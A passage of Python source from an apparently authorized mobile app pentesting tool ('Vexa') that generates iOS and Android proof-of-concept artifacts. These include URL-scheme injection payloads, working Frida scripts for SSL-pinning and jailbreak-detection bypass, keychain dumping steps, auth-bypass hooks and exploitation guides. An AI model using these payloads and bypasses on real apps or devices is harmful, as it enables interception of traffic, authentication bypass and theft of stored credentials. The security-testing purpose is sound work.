<style>body{{font:15px/1.5 system-ui,sans-serif;max-width:720px;margin:40px auto;padding:20px;background:#0d1117;color:#c9d1d9}}
h1,h2{{color:#58a6ff}} a{{color:#58a6ff;display:inline-block;padding:6px 0}} li{{margin:4px 0}}
code{{background:#161b22;padding:2px 6px;border-radius:3px;color:#ff7b72}}</style></head>
<body><h1>iOS URL Scheme PoC</h1>
<p>Target bundle: <code>{html.escape(pkg)}</code></p>
<p>Open this page in mobile Safari on the test device. Tapping a link fires the URL scheme.</p>
<h2>Bare scheme triggers</h2>
<ul>
{rows}
</ul>
<h2>Smuggled URL parameters</h2>
<ul>
  <li><a href="{first}://x?next=https://attacker.example/">?next= injection (open redirect)</a></li>
  <li><a href="{first}://x?url=javascript:alert(1)">javascript: scheme injection</a></li>
  <li><a href="{first}://x?file=../../etc/passwd">path-traversal probe</a></li>
  <li><a href="{first}://x?id=' OR '1'='1">SQL-injection probe</a></li>
  <li><a href="{first}://x?token=ATTACKER_CONTROLLED">auth token replacement</a></li>
</ul>
<h2>Manual test (Simulator)</h2>
<p>Run: <code>xcrun simctl openurl booted "{first}://path"</code></p>
<h2>Manual test (Device via Frida)</h2>
<p>Run: <code>frida -U -n {html.escape(pkg)} -e "ObjC.classes.UIApplication.sharedApplication().openURL_(NSURL.URLWithString_('{first}://test'))"</code></p>
</body></html>"""
        sh = f"""#!/bin/bash
# Vexa iOS URL scheme attack script
echo "[*] iOS URL Scheme PoC for {pkg}"
echo "Schemes: {' '.join(schemes[:10])}"
echo
echo "From Simulator:"
for s in {' '.join(schemes[:5])}; do
    echo "  xcrun simctl openurl booted '$s://test'"
done
echo
echo "From Frida (device):"
echo "  frida -U -n {pkg} -e 'ObjC.classes.UIApplication.sharedApplication().openURL_(NSURL.URLWithString_(\\"{schemes[0]}://test\\"))'"
"""
        pocs.append(PoC(
            id="poc-ios-url-schemes", finding_id="ios-custom-url-schemes",
            title=f"iOS URL scheme exploit ({len(schemes)} scheme(s))", severity="high",
            why="Custom schemes are unauthenticated by iOS - any app or web page can fire them.",
            impact="Pre-auth deep link entry, URL parameter injection, WebView XSS, auth bypass.",
            artifacts=[PoCArtifact("poc.html", poc_html, "html"),
                        PoCArtifact("attack.sh", sh, "sh")],
            confidence="needs-device",
        ))
        handled_ids.add("ios-custom-url-schemes")

    # ---- iOS Secrets PoCs (reuse Android secret validators) ----
    secret_pocs = poc_secrets(findings)
    pocs.extend(secret_pocs)
    for fnd in findings:
        if fnd["id"].startswith("ios-secret-"):
            handled_ids.add(fnd["id"])

    # ---- ATS / pinning MITM PoC ----
    ats_ids = {"ios-ats-arbitrary", "ios-ats-domain-exceptions",
               "ios-ats-webview-arbitrary", "ios-no-pinning"}
    if ats_ids & ids:
        sh = f"""#!/bin/bash
# Vexa iOS MITM setup
set -e
echo "[*] Vexa iOS MITM setup for {pkg}"
echo
echo "[1] On your machine: run Burp Suite, port 8080, bound to all interfaces"
echo "[2] Connect iOS device to same Wi-Fi network"
echo "[3] On device: Settings -> Wi-Fi -> (network) -> Configure Proxy -> Manual"
echo "    Server: <your-ip>   Port: 8080"
echo "[4] Visit http://burp on Safari -> install Burp CA profile"
echo "[5] Settings -> General -> About -> Certificate Trust Settings -> enable Burp"
echo "[6] Launch the app and exercise it"
echo
echo "If pinning is in place, run the SSL bypass Frida script first:"
echo "  frida -U -f {pkg} -l ios_ssl_bypass.js --no-pause"
"""
        pocs.append(PoC(
            id="poc-ios-mitm", finding_id="ios-ats-arbitrary",
            title="iOS MITM setup", severity="high",
            why="ATS misconfig or absent pinning permits Burp interception.",
            impact="Read/modify all API traffic in real time.",
            artifacts=[PoCArtifact("ios_mitm_setup.sh", sh, "sh")],
            confidence="needs-device",
        ))
        handled_ids |= ats_ids

    # ---- iOS Frida SSL pinning bypass ----
    frida_ios_ssl = f"""// Vexa iOS SSL pinning bypass
// Usage: frida -U -f {pkg} -l ios_ssl_bypass.js --no-pause

if (ObjC.available) {{
    console.log("[+] Vexa iOS SSL pinning bypass active");

    // Generic SecTrustEvaluate hook
    try {{
        var SecTrustEvaluate = Module.findExportByName('Security', 'SecTrustEvaluate');
        if (SecTrustEvaluate) {{
            Interceptor.replace(SecTrustEvaluate, new NativeCallback(function(trust, result) {{
                if (result) Memory.writeU32(result, 1);  // kSecTrustResultProceed
                return 0;
            }}, 'int', ['pointer', 'pointer']));
            console.log("[+] SecTrustEvaluate hooked");
        }}
    }} catch (e) {{ console.log("[-] SecTrustEvaluate: " + e); }}

    // TrustKit bypass
    try {{
        var TK = ObjC.classes.TSKPinningValidator;
        if (TK) {{
            TK['- evaluateTrust:forHostname:'].implementation = function(trust, hostname) {{
                console.log('[+] TrustKit bypassed for: ' + hostname);
                return 0;
            }};
        }}
    }} catch (e) {{}}

    // AFNetworking AFSecurityPolicy
    try {{
        var ASP = ObjC.classes.AFSecurityPolicy;
        if (ASP) {{
            ASP['- evaluateServerTrust:forDomain:'].implementation = function() {{ return true; }};
            console.log("[+] AFSecurityPolicy bypassed");
        }}
    }} catch (e) {{}}

    // NSURLSession challenge handler
    try {{
        var d = ObjC.classes.NSURLSession;
        Interceptor.attach(d['- URLSession:didReceiveChallenge:completionHandler:'].implementation, {{
            onEnter(args) {{ console.log("[+] NSURLSession challenge intercepted"); }}
        }});
    }} catch (e) {{}}
}}
"""
    pocs.append(PoC(
        id="poc-ios-ssl-bypass", finding_id="meta",
        title="iOS SSL Pinning Bypass (Frida)", severity="info",
        why="Universal pinning bypass for TrustKit, AFNetworking, NSURLSession, generic Security.framework.",
        impact="Enable Burp/mitmproxy on pinned iOS apps.",
        artifacts=[PoCArtifact("ios_ssl_bypass.js", frida_ios_ssl, "js")],
        confidence="needs-device",
    ))

    # ---- iOS Jailbreak detection bypass ----
    frida_jb = f"""// Vexa iOS jailbreak detection bypass
// Usage: frida -U -f {pkg} -l ios_jailbreak_bypass.js --no-pause

if (ObjC.available) {{
    console.log("[+] Vexa iOS jailbreak bypass active");

    var jbPaths = ['/Applications/Cydia.app','/Library/MobileSubstrate/MobileSubstrate.dylib',
        '/bin/bash','/usr/sbin/sshd','/etc/apt','/private/var/lib/apt/','/usr/bin/ssh',
        '/private/var/stash','/Library/MobileSubstrate'];

    // NSFileManager fileExistsAtPath
    try {{
        var FM = ObjC.classes.NSFileManager;
        FM['- fileExistsAtPath:'].implementation = ObjC.implement(FM['- fileExistsAtPath:'], function(self, sel, path) {{
            var p = ObjC.Object(path).toString();
            for (var i = 0; i < jbPaths.length; i++) {{
                if (p === jbPaths[i]) {{ console.log('[+] hid path: ' + p); return 0; }}
            }}
            return this(self, sel, path);
        }});
    }} catch (e) {{}}

    // canOpenURL: cydia://
    try {{
        var UA = ObjC.classes.UIApplication;
        UA['- canOpenURL:'].implementation = function(url) {{
            var s = ObjC.Object(url).absoluteString().toString();
            if (s.indexOf('cydia') >= 0) {{ console.log('[+] hid canOpenURL: ' + s); return 0; }}
            return this.canOpenURL_(url);
        }};
    }} catch (e) {{}}

    // libc fork
    Interceptor.replace(Module.findExportByName(null, 'fork'),
        new NativeCallback(function () {{ console.log('[+] fork() blocked'); return -1; }}, 'int', []));
}}
"""
    pocs.append(PoC(
        id="poc-ios-jailbreak-bypass", finding_id="meta",
        title="iOS Jailbreak Detection Bypass (Frida)", severity="info",
        why="Hooks NSFileManager, canOpenURL, and fork() to defeat common jailbreak checks.",
        impact="Run app on jailbroken device for further dynamic analysis.",
        artifacts=[PoCArtifact("ios_jailbreak_bypass.js", frida_jb, "js")],
        confidence="needs-device",
    ))

    # ---- Keychain dumping PoC ----
    keychain_findings = [f for f in findings if "keychain" in f["id"]]
    if keychain_findings:
        sh = f"""#!/bin/bash
# Vexa iOS Keychain dumping
set -e
echo "[*] Dumping Keychain items for {pkg}"
echo
echo "Method 1: Objection (recommended)"
echo "  pip install objection"
echo "  objection -g {pkg} explore"
echo "  > ios keychain dump"
echo "  > ios keychain dump --json"
echo
echo "Method 2: Test locked-device access"
echo "  Lock device, then re-attach Objection"
echo "  Items with kSecAttrAccessibleAlways still readable -> CRITICAL"
echo
echo "Method 3: Frida-based (manual)"
echo "  Hook SecItemCopyMatching, SecItemAdd, SecItemUpdate"
echo "  Capture all class/account/value tuples in real time"
"""
        pocs.append(PoC(
            id="poc-ios-keychain-dump",
            finding_id=keychain_findings[0]["id"],
            title=f"Dump iOS Keychain ({len(keychain_findings)} weak attribute(s))",
            severity="high",
            why="Weak keychain accessibility classes exposed.",
            impact="Extract user credentials/tokens from keychain.",
            artifacts=[PoCArtifact("keychain_dump.sh", sh, "sh")],
            confidence="needs-device",
        ))
        for f in keychain_findings: handled_ids.add(f["id"])

    # ---- Universal fallback for every other iOS finding ----
    for fnd in findings:
        fid = fnd.get("id", "")
        if fid in handled_ids: continue
        if fid.startswith("err-"): continue
        if fnd.get("severity") == "info": continue
        generic = build_generic_ios_poc(pkg, fnd)
        if generic:
            pocs.append(generic)

    return pocs


def build_generic_ios_poc(pkg: str, finding: dict) -> Optional['PoC']:
    """Generic exploit guide for any iOS finding without a dedicated PoC."""
    fid = finding.get("id", "")
    title = finding.get("title", "")
    sev = finding.get("severity", "info")
    desc = finding.get("description", "")
    rec = finding.get("recommendation", "")
    cat = finding.get("category", "")
    cwe = finding.get("cwe", "")
    masvs = finding.get("masvs", "")
    evidence = finding.get("evidence", "")
    references = finding.get("references", []) or []
    refs_md = "\n".join(f"- {r}" for r in references) if references else "(none)"

    md = f"""# iOS Exploitation guide: {title}

**Finding ID:** `{fid}`
**Severity:** {sev}
**Category:** {cat} {f"({cwe})" if cwe else ""} {f"[{masvs}]" if masvs else ""}
**Bundle:** `{pkg}`

## What is the issue?

{desc}

## Evidence found in this IPA

```
{evidence}
```

## How to exploit on iOS

"""

    steps = []
    if "STORAGE" in cat.upper() or "keychain" in fid:
        steps += [
            "1. Jailbreak a test device (or use Corellium for cloud iOS)",
            "2. SSH to the device, navigate to the app sandbox:",
            f"   `cd /var/mobile/Containers/Data/Application/<UUID>/`",
            "3. Inspect Library/Caches, Documents, Library/Preferences/*.plist",
            "4. Dump keychain with Objection:",
            f"   `objection -g {pkg} explore`",
            "   `ios keychain dump`",
            "5. Look for tokens, passwords, sessions in clear text",
        ]
    elif "CRYPTO" in cat.upper():
        steps += [
            "1. Decrypt the IPA (jailbroken device required):",
            f"   `frida-ios-dump -o decrypted.ipa {pkg}`",
            "2. Open the binary in Hopper / IDA / Ghidra",
            "3. Locate the affected crypto routine",
            "4. If keys are derived locally → extract via static analysis",
            "5. Use Frida to hook the crypto API and capture plaintext:",
            "   - `Module.findExportByName('libcommonCrypto.dylib', 'CCCrypt')`",
        ]
    elif "NETWORK" in cat.upper():
        steps += [
            "1. Set up Burp Suite as proxy on your machine",
            "2. Configure iOS device to proxy through Burp (Wi-Fi settings)",
            "3. Install Burp's CA cert as user profile + trust it",
            "4. Launch the app — observe traffic in Burp",
            "5. If pinning blocks you:",
            f"   `frida -U -f {pkg} -l ios_ssl_bypass.js --no-pause`",
        ]
    elif "PLATFORM" in cat.upper():
        steps += [
            "1. Identify the affected handler (URL scheme, universal link, IPC)",
            "2. Build a malicious test page or sister app to trigger the entry point",
            "3. Test parameter smuggling, unauthenticated access, type confusion",
            "4. Monitor with Console.app or `idevicesyslog` to see how the app handles the input",
        ]
    elif "RESILIENCE" in cat.upper():
        steps += [
            "1. Run on jailbroken device",
            "2. Use Objection to bypass anti-tamper:",
            f"   `objection -g {pkg} explore`",
            "   `ios jailbreak disable`",
            "   `ios sslpinning disable`",
            "3. Use Liberty Lite or Shadow tweaks for persistent jailbreak hiding",
        ]
    elif "AUTH" in cat.upper():
        steps += [
            "1. Frida-hook the auth callback:",
            "   - LAContext.evaluatePolicy callback",
            "   - Custom isAuthenticated method",
            "2. Force-return success:",
            "   `ObjC.classes.LoginVC['- isLoggedIn'].implementation = function(){return 1;};`",
            "3. For biometrics: hook the LAContext result reply block",
        ]
    elif "CODE" in cat.upper():
        steps += [
            "1. Decompile the binary (jadx works for some Swift; Hopper for Obj-C/Swift)",
            "2. Trace input → vulnerable sink",
            "3. Build a payload reaching the sink (URL scheme, file, network input)",
            "4. Validate exploitation with Frida hooks on the entry function",
        ]
    else:
        steps += [
            "1. Decrypt the IPA: `frida-ios-dump -o decrypted.ipa <bundle>`",
            "2. Inspect with class-dump / Hopper / Ghidra",
            "3. Build a minimal payload to trigger the vulnerable path",
            "4. Validate with Frida runtime hooking",
        ]

    md += "\n".join(steps) + "\n"
    md += f"""

## Remediation

{rec or "(see general iOS pentesting guidance)"}

## References

{refs_md}

## Tools

- **Frida** — https://frida.re
- **Objection** — https://github.com/sensepost/objection
- **frida-ios-dump** — https://github.com/AloneMonkey/frida-ios-dump
- **Hopper / Ghidra** — binary disassembly
- **Burp Suite** — HTTP interception
- **Sideloadly / TrollStore** — IPA installation
- **OWASP MASTG iOS** — https://mas.owasp.org/MASTG/
"""

    artifacts = [PoCArtifact("EXPLOIT.md", md, "md")]

    sh = f"""#!/bin/bash
# Vexa iOS generic PoC: {title}
# Finding: {fid}  Severity: {sev}
echo "[*] iOS exploit guide for: {title}"
echo "[*] Finding: {fid}  ({sev})"
echo "[*] Bundle: {pkg}"
echo
echo "[1] Decrypt IPA (requires jailbroken device):"
echo "    frida-ios-dump -o decrypted.ipa {pkg}"
echo
echo "[2] Disassemble the binary:"
echo "    Open in Hopper / IDA / Ghidra"
echo
echo "[3] Attach Frida for runtime analysis:"
echo "    frida -U -f {pkg} --no-pause"
echo
echo "[4] Read EXPLOIT.md in this folder for full step-by-step guidance."
"""
    artifacts.append(PoCArtifact("reproduce.sh", sh, "sh"))

    return PoC(
        id=f"poc-{fid}",
        finding_id=fid,
        title=f"iOS exploit guide: {title}",
        severity=sev,
        why=desc[:300] + ("..." if len(desc) > 300 else ""),
        impact=f"Demonstrate exploitation of '{title}' on iOS. Severity: {sev}.",
        artifacts=artifacts,
        confidence="static",
    )


def generate_pocs(report: dict) -> list:
    """Generate PoCs for the given report. Dispatches by platform.
    For Android: per-finding PoCs + universal fallback for any unhandled finding.
    For iOS: dedicated iOS PoC builder."""
    if report.get("platform") == "iOS":
        return generate_ios_pocs(report)

    pkg = report.get("metadata", {}).get("package") or "<package>"
    main_activity = report.get("metadata", {}).get("main_activity") or ".MainActivity"
    findings = report.get("findings", [])
    extras = report.get("extras", {})
    ids = {f["id"] for f in findings}

    pocs: list = []
    handled_ids = set()  # track which finding IDs got a PoC

    def _handled(*fids):
        for fid in fids:
            if fid in ids:
                handled_ids.add(fid)

    # Per-finding PoCs
    if "app-debuggable" in ids:
        pocs.append(poc_debuggable(pkg, main_activity)); _handled("app-debuggable")
    if "allow-backup" in ids:
        pocs.append(poc_allowbackup(pkg)); _handled("allow-backup", "allow-backup-explicit")

    exported = extras.get("exported_components", [])
    activities = [c for c in exported if c["tag"] in ("activity", "activity-alias")]
    services = [c for c in exported if c["tag"] == "service"]
    receivers = [c for c in exported if c["tag"] == "receiver"]
    providers = [c for c in exported if c["tag"] == "provider"]

    p = poc_exported_activities(pkg, activities)
    if p: pocs.append(p); _handled("exported-activity")
    p = poc_exported_services(pkg, services)
    if p: pocs.append(p); _handled("exported-service")
    p = poc_exported_receivers(pkg, receivers)
    if p: pocs.append(p); _handled("exported-receiver", "broadcast-receivers", "unprotected-broadcast-receivers")
    p = poc_content_providers(pkg, providers)
    if p: pocs.append(p); _handled("exported-provider", "provider-perms-weak")

    p = poc_deeplinks(pkg, extras.get("deeplinks", []))
    if p: pocs.append(p); _handled("deeplinks-exposed", "open-redirect-deeplink")

    has_js = "javascript-enabled" in ids
    has_bridge = "js-interface-bridge" in ids or "webview-addjs-iface" in ids
    has_file = any(i.startswith("webview-file") or i.startswith("webview-universal") for i in ids)
    p = poc_webview(pkg, has_js, has_bridge, has_file)
    if p:
        pocs.append(p)
        _handled("javascript-enabled", "js-interface-bridge", "webview-addjs-iface",
                 "webview-file-access", "webview-file-from-file", "webview-universal-from-file",
                 "webview-mixed-content", "webview-ssl-error-handler")

    secret_pocs = poc_secrets(findings)
    pocs.extend(secret_pocs)
    for fnd in findings:
        if fnd["id"].startswith("secret-"):
            handled_ids.add(fnd["id"])

    p = poc_mitm(pkg, ids)
    if p:
        pocs.append(p)
        _handled("trustmanager-bypass", "trustmanager-trust-all", "nsc-cleartext", "nsc-user-cas",
                 "cleartext-traffic", "weak-hostname-verifier", "hostname-verifier-allow-all",
                 "cleartext-urls")
    p = poc_weak_crypto(pkg, ids)
    if p:
        pocs.append(p)
        _handled("weak-cipher", "weak-hash", "ecb-mode", "weak-tls")

    # Always-useful tooling
    pocs.append(poc_ssl_pinning(pkg))
    pocs.append(poc_root_bypass(pkg))

    # ====== UNIVERSAL FALLBACK PoCs ======
    # Strict filter: only generate generic PoCs for findings that are GENUINELY
    # exploitable. Goal is a small, high-quality set of PoCs -- not 80+ vague guides.
    #
    # Rules:
    #   1. Severity must be critical/high (or medium if confidence is confirmed)
    #   2. Confidence must be 'likely' or 'confirmed' -- never 'possible'
    #   3. Finding must have evidence (something concrete to act on)
    #   4. Category must map to a known MASVS bucket (else the generic guide is useless)
    #   5. Must not duplicate a recipe already covered above
    EXPLOITABLE_CATEGORIES = {
        "MASVS-STORAGE", "MASVS-CRYPTO", "MASVS-NETWORK",
        "MASVS-PLATFORM", "MASVS-CODE", "MASVS-AUTH", "MASVS-RESILIENCE",
    }
    for fnd in findings:
        fid = fnd.get("id", "")
        if fid in handled_ids: continue
        if fid.startswith("err-"): continue

        sev = fnd.get("severity", "info")
        confidence = (fnd.get("confidence") or "").lower()

        # 1. Severity gate
        if sev == "info" or sev == "low":
            continue
        if sev == "medium" and confidence != "confirmed":
            continue

        # 2. Confidence gate
        if confidence == "possible":
            continue

        # 3. Evidence gate -- if there's nothing concrete, skip
        evidence = fnd.get("evidence", "") or ""
        if not evidence.strip() and not fnd.get("description"):
            continue

        # 4. Category gate -- only generate for findings in known MASVS buckets
        cat = (fnd.get("category") or "").upper()
        if not any(c in cat for c in EXPLOITABLE_CATEGORIES):
            continue

        generic = build_generic_poc(pkg, fnd)
        if generic:
            pocs.append(generic)

    return pocs


def build_generic_poc(pkg: str, finding: dict) -> Optional['PoC']:
    """Build a generic PoC artifact for any finding without a dedicated builder.
    The artifact is a Markdown 'how to exploit' guide + any relevant validation script."""
    fid = finding.get("id", "")
    title = finding.get("title", "")
    sev = finding.get("severity", "info")
    desc = finding.get("description", "")
    rec = finding.get("recommendation", "")
    cat = finding.get("category", "")
    cwe = finding.get("cwe", "")
    masvs = finding.get("masvs", "")
    evidence = finding.get("evidence", "")
    references = finding.get("references", []) or []

    # Build a Markdown exploit guide
    refs_md = "\n".join(f"- {r}" for r in references) if references else "(none)"
    md = f"""# Exploitation guide: {title}

**Finding ID:** `{fid}`
**Severity:** {sev}
**Category:** {cat} {f"({cwe})" if cwe else ""} {f"[{masvs}]" if masvs else ""}
**Confidence:** {finding.get('confidence','confirmed')}
**Source:** {finding.get('source','vexa')}

## What is the issue?

{desc}

## Evidence found in this APK

```
{evidence}
```

## How to exploit

The general approach for this class of vulnerability:

"""

    # Add category-specific exploit steps
    exploit_steps = []
    if "MASVS-STORAGE" in cat or "STORAGE" in cat.upper():
        exploit_steps += [
            "1. Install the app on a device or emulator: `adb install <apk>`",
            "2. Pull the app's data dir to find leaked secrets:",
            f"   - With root: `adb root && adb pull /data/data/{pkg}/`",
            f"   - Without root (debuggable): `adb shell run-as {pkg} ls -la /data/data/{pkg}/`",
            f"   - Without root (allowBackup): `adb backup -f app.ab -noapk {pkg}`",
            "3. Search the extracted files for tokens, credentials, PII:",
            "   - `grep -rIn -E '(token|password|secret|jwt|key)' extracted/`",
        ]
    elif "MASVS-CRYPTO" in cat or "CRYPTO" in cat.upper():
        exploit_steps += [
            "1. Decompile with jadx-gui to locate the crypto code:",
            f"   `jadx-gui <apk_file>`",
            "2. Look for the affected algorithm/key derivation",
            "3. If keys are hardcoded — extract them via static analysis",
            "4. If using ECB/weak mode — patterns can be detected in ciphertext",
            "5. Frida hook to capture plaintext before encryption / after decryption:",
            "   - Hook `javax.crypto.Cipher.doFinal()` to see all crypto operations",
        ]
    elif "MASVS-NETWORK" in cat or "NETWORK" in cat.upper():
        exploit_steps += [
            "1. Set up Burp Suite as a proxy on your machine (port 8080)",
            f"2. Configure the device proxy: `adb shell settings put global http_proxy <ip>:8080`",
            "3. Install Burp's CA certificate as a USER cert on the device",
            "4. Launch the app and intercept traffic",
            f"5. If pinning blocks you — bypass via Frida: `frida -U -f {pkg} -l ssl_bypass.js --no-pause`",
        ]
    elif "MASVS-PLATFORM" in cat or "PLATFORM" in cat.upper() or "PRIVACY" in cat.upper():
        exploit_steps += [
            "1. Build a malicious app or use ADB to fire Intents at the target",
            f"2. Trigger the affected component: `adb shell am start -n {pkg}/<component>`",
            "3. Try malicious extras / data URIs to bypass intent validation",
            f"4. Monitor via logcat: `adb logcat | grep {pkg}`",
            "5. For exported components, write a 1-line Java attacker app: `startActivity(new Intent().setClassName(pkg, target))`",
        ]
    elif "MASVS-CODE" in cat or "CODE" in cat.upper():
        exploit_steps += [
            "1. Decompile with jadx-gui to inspect the suspect code",
            f"   `jadx-gui <apk>`",
            "2. Trace user input → sink:",
            "   - Identify the input source (Intent extra, deep link, network)",
            "   - Follow the data through the code to the vulnerable sink",
            "3. Craft a payload that reaches the sink with attacker control",
            "4. If reachable from external → fire the exploit via adb am start / deep link",
            "5. If reachable only internally → use Frida to invoke the function with the payload",
        ]
    elif "MASVS-RESILIENCE" in cat or "RESILIENCE" in cat.upper():
        exploit_steps += [
            "1. Run on a rooted/jailbroken device or emulator",
            "2. Use Frida to bypass any anti-tamper detection:",
            f"   `frida -U -f {pkg} -l root_bypass.js --no-pause`",
            "3. Install Magisk + MagiskHide (or Zygisk + Shamiko) to hide root from the app",
            "4. Decompile and re-sign a modified APK if the controls are static-only",
        ]
    elif "MASVS-AUTH" in cat or "AUTH" in cat.upper():
        exploit_steps += [
            "1. Identify the authentication entry point (login activity / endpoint)",
            "2. Frida-hook the auth-success callback to force-return true:",
            "   - `Interceptor.replace(addr, new NativeCallback(function(){return 1;},...))`",
            "3. For biometric: bypass the prompt by hooking `BiometricPrompt$AuthenticationCallback.onAuthenticationSucceeded`",
            "4. For session/token issues: capture and replay tokens via Burp",
        ]
    else:
        # No MASVS bucket matched -- generic 4-step guidance isn't actionable enough
        # to be worth shipping as a PoC. Caller already filtered to known categories,
        # so this branch should never fire; if it does, drop the PoC.
        return None

    md += "\n".join(exploit_steps) + "\n"
    md += f"""

## Remediation

{rec or "(see general guidance for this category)"}

## References

{refs_md}

## Tools you'll likely need

- **jadx** — Java decompiler: https://github.com/skylot/jadx
- **apktool** — APK disassembler: https://apktool.org
- **Frida** — Dynamic instrumentation: https://frida.re
- **Burp Suite** — HTTP interception: https://portswigger.net
- **Objection** — Frida wrapper for mobile: https://github.com/sensepost/objection
- **adb** — Android Debug Bridge: part of Android SDK platform-tools
"""

    artifacts = [PoCArtifact("EXPLOIT.md", md, "md")]

    # Add a quick-reproduce shell script
    sh = f"""#!/bin/bash
# Vexa generic PoC: {title}
# Finding: {fid}  Severity: {sev}
set -e
PKG="{pkg}"
echo "[*] Vexa PoC: {title}"
echo "[*] Finding: {fid} (severity: {sev})"
echo
echo "[1] Verify finding location in the APK (decompile to read source):"
echo "    jadx-gui <apk_file>"
echo
echo "[2] Install the app on device:"
echo "    adb install <apk_file>"
echo
echo "[3] Launch & monitor logcat:"
echo "    adb shell monkey -p $PKG -c android.intent.category.LAUNCHER 1"
echo "    adb logcat -v time | grep $PKG"
echo
echo "[4] Inspect runtime state with Frida:"
echo "    frida -U -f $PKG --no-pause"
echo
echo "[5] Read the EXPLOIT.md in this folder for full step-by-step guidance."
"""
    artifacts.append(PoCArtifact("reproduce.sh", sh, "sh"))

    # Build the PoC
    poc = PoC(
        id=f"poc-{fid}",
        finding_id=fid,
        title=f"Generic exploit guide: {title}",
        severity=sev,
        why=desc[:300] + ("..." if len(desc) > 300 else ""),
        impact=f"Demonstrate exploitation of '{title}'. Severity: {sev}.",
        artifacts=artifacts,
        confidence="static",
    )
    return poc


def _safe_fs_name(s: str) -> str:
    """Sanitise a string for safe filesystem usage."""
    s = re.sub(r"[^A-Za-z0-9_.\-]", "_", s)
    return s[:120] or "unnamed"


def save_pocs_to_disk(sid: str, pocs: list) -> Path:
    """Write PoC artifacts to vexa_data/pocs/<sid>/"""
    out = POC_DIR / sid
    out.mkdir(parents=True, exist_ok=True)
    for poc in pocs:
        safe_id = _safe_fs_name(poc.id)
        d = out / safe_id
        d.mkdir(parents=True, exist_ok=True)
        for art in poc.artifacts:
            safe_fn = _safe_fs_name(art.filename)
            try:
                (d / safe_fn).write_text(art.content, encoding="utf-8")
            except Exception as e:
                log.warning("Failed to write %s/%s: %s", safe_id, safe_fn, e)
        readme = (
            f"# {poc.title}\n\n"
            f"**Severity:** {poc.severity}\n"
            f"**Targets finding:** {poc.finding_id}\n\n"
            f"## Why this matters\n{poc.why}\n\n"
            f"## Impact\n{poc.impact}\n\n"
            f"## Files\n"
            + "\n".join(f"- `{_safe_fs_name(a.filename)}`" for a in poc.artifacts)
            + "\n"
        )
        try:
            (d / "README.md").write_text(readme, encoding="utf-8")
        except Exception as e:
            log.warning("Failed to write README for %s: %s", safe_id, e)
    return out


async def auto_verify_pocs(report: dict, pocs: list, serial: Optional[str]) -> list:
    """Execute the automated_cmd of each PoC against the device.
    Marks pocs as verified/failed and stores the actual output."""
    devs = await adb_devices()
    if not devs:
        for p in pocs:
            if p.confidence == "static":
                p.confidence = "needs-device"
        return pocs

    if not serial:
        serial = devs[0]["serial"]

    for poc in pocs:
        if poc.automated_cmd is None:
            continue
        log.info("Auto-verifying PoC: %s", poc.id)
        r = await adb_run(poc.automated_cmd, serial=serial, timeout=20)
        poc.last_run = {
            "command": r["cmd"],
            "stdout": (r["stdout"] or "")[:3000],
            "stderr": (r["stderr"] or "")[:1000],
            "ok": r["ok"],
        }
        if r["ok"]:
            if poc.success_indicator and poc.success_indicator in r["stdout"]:
                poc.confidence = "verified"
            elif r["stdout"].strip():
                poc.confidence = "verified"
            else:
                poc.confidence = "failed"
        else:
            poc.confidence = "failed"
    return pocs
# =============================================================================
# Optional Ollama integration (auto-detects local LLM, no API keys)
# =============================================================================
async def ollama_available() -> bool:
    """Check if a local Ollama server is running."""
    url = os.getenv("OLLAMA_URL", "http://localhost:11434")
    try:
        async with httpx.AsyncClient(timeout=2.0) as c:
            r = await c.get(f"{url}/api/tags")
            return r.status_code == 200
    except Exception:
        return False


async def ollama_list_models() -> list:
    url = os.getenv("OLLAMA_URL", "http://localhost:11434")
    try:
        async with httpx.AsyncClient(timeout=5.0) as c:
            r = await c.get(f"{url}/api/tags")
            if r.status_code == 200:
                return [m.get("name", "") for m in r.json().get("models", [])]
    except Exception:
        pass
    return []


async def ollama_chat(messages: list, report: dict, model: str) -> str:
    url = os.getenv("OLLAMA_URL", "http://localhost:11434").rstrip("/")
    short = {
        "metadata": report.get("metadata", {}),
        "summary": report.get("summary", {}),
        "findings": report.get("findings", [])[:50],
        "extras": {
            "deeplinks": report.get("extras", {}).get("deeplinks", [])[:20],
            "permissions": report.get("extras", {}).get("permissions", []),
            "exported_components": report.get("extras", {}).get("exported_components", [])[:30],
        },
    }
    system = (
        "You are an expert Android application security engineer. "
        "The complete machine-generated findings report from Vexa is below. "
        "Use it as your primary source of truth. When the user asks about exploitation, "
        "give concrete steps: adb commands, sample deep link URIs, frida hook ideas. "
        "Do not invent findings.\n\n"
        f"Report:\n```json\n{json.dumps(short, indent=2)}\n```"
    )
    payload = {
        "model": model, "stream": False,
        "messages": [{"role": "system", "content": system}] + messages,
        "options": {"temperature": 0.2},
    }
    try:
        async with httpx.AsyncClient(timeout=300) as c:
            r = await c.post(f"{url}/api/chat", json=payload)
        if r.status_code >= 400:
            return f"Ollama error: {r.text[:300]}"
        return r.json().get("message", {}).get("content", "(empty)")
    except httpx.ConnectError as e:
        return f"Cannot reach Ollama at {url}: {e}"


# =============================================================================
# FastAPI app
# =============================================================================
app = FastAPI(title="Vexa", docs_url=None, redoc_url=None, openapi_url=None)
# Tight CORS — same-origin only since the frontend is bundled with the API
app.add_middleware(CORSMiddleware, allow_origins=[], allow_methods=["*"], allow_headers=["*"])


# Global exception handler: never leak stack traces to clients
from fastapi.exceptions import RequestValidationError
from starlette.exceptions import HTTPException as StarletteHTTPException


@app.exception_handler(StarletteHTTPException)
async def _http_exc_handler(request: Request, exc: StarletteHTTPException):
    return JSONResponse(status_code=exc.status_code, content={"detail": exc.detail})


@app.exception_handler(RequestValidationError)
async def _validation_exc_handler(request: Request, exc: RequestValidationError):
    return JSONResponse(status_code=422, content={"detail": "Invalid request body"})


@app.exception_handler(Exception)
async def _generic_exc_handler(request: Request, exc: Exception):
    # Log the full traceback server-side, but return a generic message to the client
    log.exception("Unhandled error on %s %s", request.method, request.url.path)
    return JSONResponse(status_code=500,
                        content={"detail": "Internal server error. Check server logs."})


# =============================================================================
# Authentication, Sessions, CSRF, and Rate Limiting
# Production-grade controls:
#   - First-run setup wizard (no default credentials in code)
#   - Argon2-equivalent password hashing via PBKDF2-HMAC-SHA256 (stdlib-only)
#   - Per-IP login rate limit (5 attempts / 15 minutes)
#   - HttpOnly + SameSite=Strict cookies, Secure when HTTPS detected
#   - Per-session CSRF token (double-submit pattern)
# =============================================================================
import secrets as _secrets
import hashlib
import hmac
import time
from collections import defaultdict, deque

CONFIG_FILE = ROOT / "vexa_config.json"
SESSIONS = {}        # token -> {"created_at": float, "csrf": str, "user": str, "ip": str}
SESSION_TTL = 8 * 3600
COOKIE_NAME = "vexa_session"
CSRF_HEADER = "X-Vexa-Csrf"
